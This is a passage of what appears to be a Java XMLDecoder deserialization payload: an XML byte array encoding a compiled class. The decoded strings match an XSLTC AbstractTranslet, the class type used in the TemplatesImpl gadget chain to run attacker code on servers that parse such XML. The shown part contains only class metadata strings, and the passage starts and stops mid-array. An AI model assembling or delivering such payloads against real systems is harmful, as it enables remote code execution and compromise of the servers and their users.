&lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="836"&gt; &lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="837"&gt; &lt;byte&gt;110&lt;/byte&gt;&lt;/void&gt;&lt;void index="838"&gt; &lt;byte&gt;47&lt;/byte&gt;&lt;/void&gt;&lt;void index="839"&gt; &lt;byte&gt;105&lt;/byte&gt;&lt;/void&gt;&lt;void index="840"&gt; &lt;byte&gt;110&lt;/byte&gt;&lt;/void&gt;&lt;void index="841"&gt; &lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="842"&gt; &lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="843"&gt; &lt;byte&gt;114&lt;/byte&gt;&lt;/void&gt;&lt;void index="844"&gt; &lt;byte&gt;110&lt;/byte&gt;&lt;/void&gt;&lt;void index="845"&gt; &lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="846"&gt; &lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="847"&gt; &lt;byte&gt;47&lt;/byte&gt;&lt;/void&gt;&lt;void index="848"&gt; &lt;byte&gt;120&lt;/byte&gt;&lt;/void&gt;&lt;void index="849"&gt; &lt;byte&gt;115&lt;/byte&gt;&lt;/void&gt;&lt;void index="850"&gt; &lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="851"&gt; &lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="852"&gt; &lt;byte&gt;99&lt;/byte&gt;&lt;/void&gt;&lt;void index="853"&gt; &lt;byte&gt;47&lt;/byte&gt;&lt;/void&gt;&lt;void index="854"&gt; &lt;byte&gt;68&lt;/byte&gt;&lt;/void&gt;&lt;void index="855"&gt; &lt;byte&gt;79&lt;/byte&gt;&lt;/void&gt;&lt;void index="856"&gt; &lt;byte&gt;77&lt;/byte&gt;&lt;/void&gt;&lt;void index="857"&gt; &lt;byte&gt;59&lt;/byte&gt;&lt;/void&gt;&lt;void index="858"&gt; &lt;byte&gt;1&lt;/byte&gt;&lt;/void&gt;&lt;void index="860"&gt; &lt;byte&gt;8&lt;/byte&gt;&lt;/void&gt;&lt;void index="861"&gt; &lt;byte&gt;104&lt;/byte&gt;&lt;/void&gt;&lt;void index="862"&gt; &lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="863"&gt; &lt;byte&gt;110&lt;/byte&gt;&lt;/void&gt;&lt;void index="864"&gt; &lt;byte&gt;100&lt;/byte&gt;&lt;/void&gt;&lt;void index="865"&gt; &lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="866"&gt; &lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="867"&gt; &lt;byte&gt;114&lt;/byte&gt;&lt;/void&gt;&lt;void index="868"&gt; &lt;byte&gt;115&lt;/byte&gt;&lt;/void&gt;&lt;void index="869"&gt; &lt;byte&gt;1&lt;/byte&gt;&lt;/void&gt;&lt;void index="871"&gt; &lt;byte&gt;66&lt;/byte&gt;&lt;/void&gt;&lt;void index="872"&gt; &lt;byte&gt;91&lt;/byte&gt;&lt;/void&gt;&lt;void index="873"&gt; &lt;byte&gt;76&lt;/byte&gt;&lt;/void&gt;&lt;void index="874"&gt; &lt;byte&gt;99&lt;/byte&gt;&lt;/void&gt;&lt;void index="875"&gt; &lt;byte&gt;111&lt;/byte&gt;&lt;/void&gt;&lt;void index="876"&gt; &lt;byte&gt;109&lt;/byte&gt;&lt;/void&gt;&lt;void index="877"&gt; &lt;byte&gt;47&lt;/byte&gt;&lt;/void&gt;&lt;void index="878"&gt; &lt;byte&gt;115&lt;/byte&gt;&lt;/void&gt;&lt;void index="879"&gt; &lt;byte&gt;117&lt;/byte&gt;&lt;/void&gt;&lt;void index="880"&gt; &lt;byte&gt;110&lt;/byte&gt;&lt;/void&gt;&lt;void index="881"&gt; &lt;byte&gt;47&lt;/byte&gt;&lt;/void&gt;&lt;void index="882"&gt; &lt;byte&gt;111&lt;/byte&gt;&lt;/void&gt;&lt;void index="883"&gt; &lt;byte&gt;114&lt;/byte&gt;&lt;/void&gt;&lt;void index="884"&gt; &lt;byte&gt;103&lt;/byte&gt;&lt;/void&gt;&lt;void index="885"&gt; &lt;byte&gt;47&lt;/byte&gt;&lt;/void&gt;&lt;void index="886"&gt; &lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="887"&gt; &lt;byte&gt;112&lt;/byte&gt;&lt;/void&gt;&lt;void index="888"&gt; &lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="889"&gt; &lt;byte&gt;99&lt;/byte&gt;&lt;/void&gt;&lt;void index="890"&gt; &lt;byte&gt;104&lt;/byte&gt;&lt;/void&gt;&lt;void index="891"&gt; &lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="892"&gt; &lt;byte&gt;47&lt;/byte&gt;&lt;/void&gt;&lt;void index="893"&gt; &lt;byte&gt;120&lt;/byte&gt;&lt;/void&gt;&lt;void index="894"&gt; &lt;byte&gt;109&lt;/byte&gt;&lt;/void&gt;&lt;void index="895"&gt; &lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="896"&gt; &lt;byte&gt;47&lt;/byte&gt;&lt;/void&gt;&lt;void index="897"&gt; &lt;byte&gt;105&lt;/byte&gt;&lt;/void&gt;&lt;void index="898"&gt; &lt;byte&gt;110&lt;/byte&gt;&lt;/void&gt;&lt;void index="899"&gt; &lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="900"&gt; &lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="901"&gt; &lt;byte&gt;114&lt;/byte&gt;&lt;/void&gt;&lt;void index="902"&gt; &lt;byte&gt;110&lt;/byte&gt;&lt;/void&gt;&lt;void index="903"&gt; &lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="904"&gt; &lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="905"&gt; &lt;byte&gt;47&lt;/byte&gt;&lt;/void&gt;&lt;void index="906"&gt; &lt;byte&gt;115&lt;/byte&gt;&lt;/void&gt;&lt;void index="907"&gt; &lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="908"&gt; &lt;byte&gt;114&lt;/byte&gt;&lt;/void&gt;&lt;void index="909"&gt; &lt;byte&gt;105&lt;/byte&gt;&lt;/void&gt;&lt;void index="910"&gt; &lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="911"&gt; &lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="912"&gt; &lt;byte&gt;105&lt;/byte&gt;&lt;/void&gt;&lt;void index="913"&gt; &lt;byte&gt;122&lt;/byte&gt;&lt;/void&gt;&lt;void index="914"&gt; &lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="915"&gt; &lt;byte&gt;114&lt;/byte&gt;&lt;/void&gt;&lt;void index="916"&gt; &lt;byte&gt;47&lt;/byte&gt;&lt;/void&gt;&lt;void index="917"&gt; &lt;byte&gt;83&lt;/byte&gt;&lt;/void&gt;&lt;void index="918"&gt; &lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="919"&gt; &lt;byte&gt;114&lt;/byte&gt;&lt;/void&gt;&lt;void index="920"&gt; &lt;byte&gt;105&lt;/byte&gt;&lt;/void&gt;&lt;void index="921"&gt; &lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="922"&gt; &lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="923"&gt; &lt;byte&gt;105&lt;/byte&gt;&lt;/void&gt;&lt;void index="924"&gt; &lt;byte&gt;122&lt;/byte&gt;&lt;/void&gt;&lt;void index="925"&gt; &lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="926"&gt; &lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="927"&gt; &lt;byte&gt;105&lt;/byte&gt;&lt;/void&gt;&lt;void index="928"&gt; &lt;byte&gt;111&lt;/byte&gt;&lt;/void&gt;&lt;void index="929"&gt; &lt;byte&gt;110&lt;/byte&gt;&lt;/void&gt;&lt;void index="930"&gt; &lt;byte&gt;72&lt;/byte&gt;&lt;/void&gt;&lt;void index="931"&gt; &lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="932"&gt; &lt;byte&gt;110&lt;/byte&gt;&lt;/void&gt;&lt;void index="933"&gt; &lt;byte&gt;100&lt;/byte&gt;&lt;/void&gt;&lt;void index="934"&gt; &lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="935"&gt; &lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="936"&gt; &lt;byte&gt;114&lt;/byte&gt;&lt;/void&gt;&lt;void index="937"&gt; &lt;byte&gt;59&lt;/byte&gt;&lt;/void&gt;&lt;void index="938"&gt; &lt;byte&gt;1&lt;/byte&gt;&lt;/void&gt;&lt;void index="940"&gt; &lt;byte&gt;10&lt;/byte&gt;&lt;/void&gt;&lt;void index="941"&gt; &lt;byte&gt;69&lt;/byte&gt;&lt;/void&gt;&lt;void index="942"&gt; &lt;byte&gt;120&lt;/byte&gt;&lt;/void&gt;&lt;void index="943"&gt; &lt;byte&gt;99&lt;/byte&gt;&lt;/void&gt;&lt;void index="944"&gt; &lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="945"&gt; &lt;byte&gt;112&lt;/byte&gt;&lt;/void&gt;&lt;void index="946"&gt; &lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="947"&gt; &lt;byte&gt;105&lt;/byte&gt;&lt;/void&gt;&lt;void index="948"&gt; &lt;byte&gt;111&lt;/byte&gt;&lt;/void&gt;&lt;void index="949"&gt; &lt;byte&gt;110&lt;/byte&gt;&lt;/void&gt;&lt;void index="950"&gt; &lt;byte&gt;115&lt;/byte&gt;&lt;/void&gt;&lt;void index="951"&gt; &lt;byte&gt;7&lt;/byte&gt;&lt;/void&gt;&lt;void index="953"&gt; &lt;byte&gt;39&lt;/byte&gt;&lt;/void&gt;&lt;void index="954"&gt; &lt;byte&gt;1&lt;/byte&gt;&lt;/void&gt;&lt;void index="956"&gt; &lt;byte&gt;-90&lt;/byte&gt;&lt;/void&gt;&lt;void index="957"&gt; &lt;byte&gt;40&lt;/byte&gt;&lt;/void&gt;&lt;void index="958"&gt; &lt;byte&gt;76&lt;/byte&gt;&lt;/void&gt;&lt;void index="959"&gt; &lt;byte&gt;99&lt;/byte&gt;&lt;/void&gt;&lt;void index="960"&gt; &lt;byte&gt;111&lt;/byte&gt;&lt;/void&gt;&lt;void index="961"&gt; &lt;byte&gt;109&lt;/byte&gt;&lt;/void&gt;&lt;void index="962"&gt; &lt;byte&gt;47&lt;/byte&gt;&lt;/void&gt;&lt;void index="963"&gt; &lt;byte&gt;115&lt;/byte&gt;&lt;/void&gt;&lt;void index="964"&gt; &lt;byte&gt;117&lt;/byte&gt;&lt;/void&gt;&lt;void index="965"&gt; &lt;byte&gt;110&lt;/byte&gt;&lt;/void&gt;&lt;void index="966"&gt; &lt;byte&gt;47&lt;/byte&gt;&lt;/void&gt;&lt;void index="967"&gt; &lt;byte&gt;111&lt;/byte&gt;&lt;/void&gt;&lt;void index="968"&gt; &lt;byte&gt;114&lt;/byte&gt;&lt;/void&gt;&lt;void index="969"&gt; &lt;byte&gt;103&lt;/byte&gt;&lt;/void&gt;&lt;void index="970"&gt; &lt;byte&gt;47&lt;/byte&gt;&lt;/void&gt;&lt;void index="971"&gt; &lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="972"&gt; &lt;byte&gt;112&lt;/byte&gt;&lt;/void&gt;&lt;void index="973"&gt; &lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="974"&gt; &lt;byte&gt;99&lt;/byte&gt;&lt;/void&gt;&lt;void index="975"&gt; &lt;byte&gt;104&lt;/byte&gt;&lt;/void&gt;&lt;void index="976"&gt; &lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="977"&gt; &lt;byte&gt;47&lt;/byte&gt;&lt;/void&gt;&lt;void index="978"&gt; &lt;byte&gt;120&lt;/byte&gt;&lt;/void&gt;&lt;void index="979"&gt; &lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="980"&gt; &lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="981"&gt; &lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="982"&gt; &lt;byte&gt;110&lt;/byte&gt;&lt;/void&gt;&lt;void index="983"&gt; &lt;byte&gt;47&lt;/byte&gt;&lt;/void&gt;&lt;void index="984"&gt; &lt;byte&gt;105&lt;/byte&gt;&lt;/void&gt;&lt;void index="985"&gt; &lt;byte&gt;110&lt;/byte&gt;&lt;/void&gt;&lt;void index="986"&gt; &lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="987"&gt; &lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="988"&gt; &lt;byte&gt;114&lt;/byte&gt;&lt;/void&gt;&lt;void index="989"&gt; &lt;byte&gt;110&lt;/byte&gt;&lt;/void&gt;&lt;void index="990"&gt; &lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="991"&gt; &lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="992"&gt; &lt;byte&gt;47&lt;/byte&gt;&lt;/void&gt;&lt;void index="993"&gt; &lt;byte&gt;120&lt;/byte&gt;&lt;/void&gt;&lt;void index="994"&gt; &lt;byte&gt;115&lt;/byte&gt;&lt;/void&gt;&lt;void index="995"&gt; &lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="996"&gt; &lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="997"&gt; &lt;byte&gt;99&lt;/byte&gt;&lt;/void&gt;&lt;void index="998"&gt; &lt;byte&gt;47&lt;/byte&gt;&lt;/void&gt;&lt;void index="999"&gt; &lt;byte&gt;68&lt;/byte&gt;&lt;/void&gt;&lt;void index="1000"&gt; &lt;byte&gt;79&lt;/byte&gt;&lt;/void&gt;&lt;void index="1001"&gt; &lt;byte&gt;77&lt;/byte&gt;&lt;/void&gt;&lt;void index="1002"&gt; &lt;byte&gt;59&lt;/byte&gt;&lt;/void&gt;&lt;void index="1003"&gt; &lt;byte&gt;76&lt;/byte&gt;&lt;/void&gt;&lt;void index="1004"&gt; &lt;byte&gt;99&lt;/byte&gt;&lt;/void&gt;&lt;void index="1005"&gt; &lt;byte&gt;111&lt;/byte&gt;&lt;/void&gt;&lt;void index="1006"&gt; &lt;byte&gt;109&lt;/byte&gt;&lt;/void&gt;&lt;void index="1007"&gt; &lt;byte&gt;47&lt;/byte&gt;&lt;/void&gt;&lt;void index="1008"&gt; &lt;byte&gt;115&lt;/byte&gt;&lt;/void&gt;&lt;void index="1009"&gt; &lt;byte&gt;117&lt;/byte&gt;&lt;/void&gt;&lt;void index="1010"&gt; &lt;byte&gt;110&lt;/byte&gt;&lt;/void&gt;&lt;void index="1011"&gt; &lt;byte&gt;47&lt;/byte&gt;&lt;/void&gt;&lt;void index="1012"&gt; &lt;byte&gt;111&lt;/byte&gt;&lt;/void&gt;&lt;void index="1013"&gt; &lt;byte&gt;114&lt;/byte&gt;&lt;/void&gt;&lt;void index="1014"&gt; &lt;byte&gt;103&lt;/byte&gt;&lt;/void&gt;&lt;void index="1015"&gt; &lt;byte&gt;47&lt;/byte&gt;&lt;/void&gt;&lt;void index="1016"&gt; &lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="1017"&gt; &lt;byte&gt;112&lt;/byte&gt;&lt;/void&gt;&lt;void index="1018"&gt; &lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="1019"&gt; &lt;byte&gt;99&lt;/byte&gt;&lt;/void&gt;&lt;void index="1020"&gt; &lt;byte&gt;104&lt;/byte&gt;&lt;/void&gt;&lt;void index="1021"&gt; &lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="1022"&gt; &lt;byte&gt;47&lt;/byte&gt;&lt;/void&gt;&lt;void index="1023"&gt; &lt;byte&gt;120&lt;/byte&gt;&lt;/void&gt;&lt;void index="1024"&gt; &lt;byte&gt;109&lt;/byte&gt;&lt;/void&gt;&lt;void index="1025"&gt; &lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="1026"&gt; &lt;byte&gt;47&lt;/byte&gt;&lt;/void&gt;&lt;void index="1027"&gt; &lt;byte&gt;105&lt;/byte&gt;&lt;/void&gt;&lt;void index="1028"&gt; &lt;byte&gt;110&lt;/byte&gt;&lt;/void&gt;&lt;void index="1029"&gt; &lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="1030"&gt; &lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="1031"&gt; &lt;byte&gt;114&lt;/byte&gt;&lt;/void&gt;&lt;void index="1032"&gt; &lt;byte&gt;110&lt;/byte&gt;&lt;/void&gt;&lt;void index="1033"&gt; &lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="1034"&gt; &lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="1035"&gt; &lt;byte&gt;47&lt;/byte&gt;&lt;/void&gt;&lt;void index="1036"&gt; &lt;byte&gt;100&lt;/byte&gt;&lt;/void&gt;&lt;void index="1037"&gt; &lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="1038"&gt; &lt;byte&gt;109&lt;/byte&gt;&lt;/void&gt;&lt;void index="1039"&gt; &lt;byte&gt;47&lt;/byte&gt;&lt;/void&gt;&lt;void index="1040"&gt; &lt;byte&gt;68&lt;/byte&gt;&lt;/void&gt;&lt;void index="1041"&gt; &lt;byte&gt;84&lt;/byte&gt;&lt;/void&gt;&lt;void index="1042"&gt; &lt;byte&gt;77&lt;/byte&gt;&lt;/void&gt;&lt;void index="1043"&gt; &lt;byte&gt;65&lt;/byte&gt;&lt;/void&gt;&lt;void index="1044"&gt; &lt;byte&gt;120&lt;/byte&gt;&lt;/void&gt;&lt;void index="1045"&gt; &lt;byte&gt;105&lt;/byte&gt;&lt;/void&gt;&lt;void index="1046"&gt; &lt;byte&gt;115&lt;/byte&gt;&lt;/void&gt;&lt;void index="1047"&gt; &lt;byte&gt;73&lt;/byte&gt;&lt;/void&gt;&lt;void index="1048"&gt; &lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="1049"&gt; &lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="1050"&gt; &lt;byte&gt;114&lt;/byte&gt;&lt;/void&gt;&lt;void index="1051"&gt; &lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="1052"&gt; &lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="1053"&gt; &lt;byte&gt;111&lt;/byte&gt;&lt;/void&gt;&lt;void index="1054"&gt; &lt;byte&gt;114&lt;/byte&gt;&lt;/void&gt;&lt;void index="1055"&gt; &lt;byte&gt;59&lt;/byte&gt;&lt;/void&gt;&lt;void index="1056"&gt; &lt;byte&gt;76&lt;/byte&gt;&lt;/void&gt;&lt;void index="1057"&gt; &lt;byte&gt;99&lt;/byte&gt;&lt;/void&gt;&lt;void index="1058"&gt; &lt;byte&gt;111&lt;/byte&gt;&lt;/void&gt;&lt;void index="1059"&gt; &lt;byte&gt;109&lt;/byte&gt;&lt;/void&gt;&lt;void index="1060"&gt; &lt;byte&gt;47&lt;/byte&gt;&lt;/void&gt;&lt;void index="1061"&gt; &lt;byte&gt;115&lt;/byte&gt;&lt;/void&gt;&lt;void index="1062"&gt; &lt;byte&gt;117&lt;/byte&gt;&lt;/void&gt;&lt;void index="1063"&gt; &lt;byte&gt;110&lt;/byte&gt;&lt;/void&gt;&lt;void index="1064"&gt; &lt;byte&gt;47&lt;/byte&gt;&lt;/void&gt;&lt;void index="1065"&gt; &lt;byte&gt;111&lt;/byte&gt;&lt;/void&gt;&lt;void index="1066"&gt; &lt;byte&gt;114&lt;/byte&gt;&lt;/void&gt;&lt;void index="1067"&gt; &lt;byte&gt;103&lt;/byte&gt;&lt;/void&gt;&lt;void index="1068"&gt; &lt;byte&gt;47&lt;/byte&gt;&lt;/void&gt;&lt;void index="1069"&gt; &lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="1070"&gt; &lt;byte&gt;112&lt;/byte&gt;&lt;/void&gt;&lt;void index="1071"&gt; &lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="1072"&gt; &lt;byte&gt;99&lt;/byte&gt;&lt;/void&gt;&lt;void index="1073"&gt; &lt;byte&gt;104&lt;/byte&gt;&lt;/void&gt;&lt;void index="1074"&gt; &lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="1075"&gt; &lt;byte&gt;47&lt;/byte&gt;&lt;/void&gt;&lt;void index="1076"&gt; &lt;byte&gt;120&lt;/byte&gt;&lt;/void&gt;&lt;void index="1077"&gt; &lt;byte&gt;109&lt;/byte&gt;&lt;/void&gt;&lt;void index="1078"&gt; &lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="1079"&gt; &lt;byte&gt;47&lt;/byte&gt;&lt;/void&gt;&lt;void index="1080"&gt; &lt;byte&gt;105&lt;/byte&gt;&lt;/void&gt;&lt;void index="1081"&gt; &lt;byte&gt;110&lt;/byte&gt;&lt;/void&gt;&lt;void index="1082"&gt; &lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="1083"&gt; &lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="1084"&gt; &lt;byte&gt;114&lt;/byte&gt;&lt;/void&gt;&lt;void index="1085"&gt; &lt;byte&gt;110&lt;/byte&gt;&lt;/void&gt;&lt;void index="1086"&gt; &lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="1087"&gt; &lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="1088"&gt; &lt;byte&gt;47&lt;/byte&gt;&lt;/void&gt;&lt;void index="1089"&gt; &lt;byte&gt;115&lt;/byte&gt;&lt;/void&gt;&lt;void index="1090"&gt; &lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="1091"&gt; &lt;byte&gt;114&lt;/byte&gt;&lt;/void&gt;&lt;void index="1092"&gt; &lt;byte&gt;105&lt;/byte&gt;&lt;/void&gt;&lt;void index="1093"&gt; &lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="1094"&gt; &lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="1095"&gt; &lt;byte&gt;105&lt;/byte&gt;&lt;/void&gt;&lt;void index="1096"&gt; &lt;byte&gt;122&lt;/byte&gt;&lt;/void&gt;&lt;void index="1097"&gt; &lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="1098"&gt; &lt;byte&gt;114&lt;/byte&gt;&lt;/void&gt;&lt;void index="1099"&gt; &lt;byte&gt;47&lt;/byte&gt;&lt;/void&gt;&lt;void index="1100"&gt; &lt;byte&gt;83&lt;/byte&gt;&lt;/void&gt;&lt;void index="1101"&gt; &lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="1102"&gt; &lt;byte&gt;114&lt;/byte&gt;&lt;/void&gt;&lt;void index="1103"&gt; &lt;byte&gt;105&lt;/byte&gt;&lt;/void&gt;&lt;void index="1104"&gt; &lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="1105"&gt; &lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="1106"&gt; &lt;byte&gt;105&lt;/byte&gt;&lt;/void&gt;&lt;void index="1107"&gt; &lt;byte&gt;122&lt;/byte&gt;&lt;/void&gt;&lt;void index="1108"&gt; &lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="1109"&gt; &lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="1110"&gt; &lt;byte&gt;105&lt;/byte&gt;&lt;/void&gt;&lt;void index="1111"&gt; &lt;byte&gt;111&lt;/byte&gt;&lt;/void&gt;&lt;void index="1112"&gt; &lt;byte&gt;110&lt;/byte&gt;&lt;/void&gt;&lt;void index="1113"&gt; &lt;byte&gt;72&lt;/byte&gt;&lt;/void&gt;&lt;void index="1114"&gt; &lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="1115"&gt; &lt;byte&gt;110&lt;/byte&gt;&lt;/void&gt;&lt;void index="1116"&gt; &lt;byte&gt;100&lt;/byte&gt;&lt;/void&gt;&lt;void index="1117"&gt; &lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="1118"&gt; &lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="1119"&gt; &lt;byte&gt;114&lt;/byte&gt;&lt;/void&gt;&lt;void index="1120"&gt; &lt;byte&gt;59&lt;/byte&gt;&lt;/void&gt;&lt;void index="1121"&gt; &lt;byte&gt;41&lt;/byte&gt;&lt;/void&gt;&lt;void index="1122"&gt; &lt;byte&gt;86&lt;/byte&gt;&lt;/void&gt;&lt;void index="1123"&gt; &lt;byte&gt;1&lt;/byte&gt;&lt;/void&gt;&lt;void index="1125"&gt; &lt;byte&gt;8&lt;/byte&gt;&lt;/void&gt;&lt;void index="1126"&gt; &lt;byte&gt;105&lt;/byte&gt;&lt;/void&gt;&lt;void index="1127"&gt; &lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="1128"&gt; &lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="1129"&gt; &lt;byte&gt;114&lt;/byte&gt;&lt;/void&gt;&lt;void index="1130"&gt; &lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="1131"&gt; &lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="1132"&gt; &lt;byte&gt;111&lt;/byte&gt;&lt;/void&gt;&lt;void index="1133"&gt; &lt;byte&gt;114&lt;/byte&gt;&lt;/void&gt;&lt;void index="1134"&gt; &lt;byte&gt;1&lt;/byte&gt;&lt;/void&gt;&lt;void index="1136"&gt; &lt;byte&gt;53&lt;/byte&gt;&lt;/void&gt;&lt;void index="1137"&gt; &lt;byte&gt;76&lt;/byte&gt;&lt;/void&gt;&lt;void index="1138"&gt; &lt;byte&gt;99&lt;/byte&gt;&lt;/void&gt;&lt;void index="1139"&gt; &lt;byte&gt;111&lt;/byte&gt;&lt;/void&gt;&lt;void index="1140"&gt; &lt;byte&gt;109&lt;/byte&gt;&lt;/void&gt;&lt;void index="1141"&gt; &lt;byte&gt;47&lt;/byte&gt;&lt;/void&gt;&lt;void index="1142"&gt; &lt;byte&gt;115&lt;/byte&gt;&lt;/void&gt;&lt;void index="1143"&gt; &lt;byte&gt;117&lt;/byte&gt;&lt;/void&gt;&lt;void index="1144"&gt; &lt;byte&gt;110&lt;/byte&gt;&lt;/void&gt;&lt;void index="1145"&gt; &lt;byte&gt;47&lt;/byte&gt;&lt;/void&gt;&lt;void index="1146"&gt; &lt;byte&gt;111&lt;/byte&gt;&lt;/void&gt;&lt;void index="1147"&gt; &lt;byte&gt;114&lt;/byte&gt;&lt;/void&gt;&lt;void index="1148"&gt; &lt;byte&gt;103&lt;/byte&gt;&lt;/void&gt;&lt;void index="1149"&gt; &lt;byte&gt;47&lt;/byte&gt;&lt;/void&gt;&lt;void index="1150"&gt; &lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="1151"&gt; &lt;byte&gt;112&lt;/byte&gt;&lt;/void&gt;&lt;void index="1152"&gt; &lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="1153"&gt; &lt;byte&gt;99&lt;/byte&gt;&lt;/void&gt;&lt;void index="1154"&gt; &lt;byte&gt;104&lt;/byte&gt;&lt;/void&gt;&lt;void index="1155"&gt; &lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="1156"&gt; &lt;byte&gt;47&lt;/byte&gt;&lt;/void&gt;&lt;void index="1157"&gt; &lt;byte&gt;120&lt;/byte&gt;&lt;/void&gt;&lt;void index="1158"&gt; &lt;byte&gt;109&lt;/byte&gt;&lt;/void&gt;&lt;void index="1159"&gt; &lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="1160"&gt; &lt;byte&gt;47&lt;/byte&gt;&lt;/void&gt;&lt;void index="1161"&gt; &lt;byte&gt;105&lt;/byte&gt;&lt;/void&gt;&lt;void index="1162"&gt; &lt;byte&gt;110&lt;/byte&gt;&lt;/void&gt;&lt;void index="1163"&gt; &lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="1164"&gt; &lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="1165"&gt; &lt;byte&gt;114&lt;/byte&gt;&lt;/void&gt;&lt;void index="1166"&gt; &lt;byte&gt;110&lt;/byte&gt;&lt;/void&gt;&lt;void index="1167"&gt; &lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="1168"&gt; &lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="1169"&gt; &lt;byte&gt;47&lt;/byte&gt;&lt;/void&gt;&lt;void index="1170"&gt; &lt;byte&gt;100&lt;/byte&gt;&lt;/void&gt;&lt;void index="1171"&gt; 